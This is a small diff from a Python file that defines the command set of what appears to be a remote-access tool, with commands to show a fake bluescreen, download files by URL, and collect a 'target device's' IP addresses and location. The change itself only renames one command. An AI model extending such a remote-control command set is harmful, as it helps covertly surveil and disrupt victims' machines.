@@ -26,10 +26,10 @@ class Command(enum.Enum):
     BLUESCREEN = "bluescreen"  # Active fake bluescreen (Windows only)
     DOWNLOAD = "dl"            # Download file by URL.
 
-    # INFO
+    # Information
     WAN_IP = "wan_ip"          # Get the WAN IP
     LAN_IP = "lan_ip"          # Get the LAN IP
-    LOCATION = "location"           # Get the location from target device.
+    GEO_INFO = "geo_info"      # Get the location from target device.
 
 
 def get_cmd_params(full_cmd):
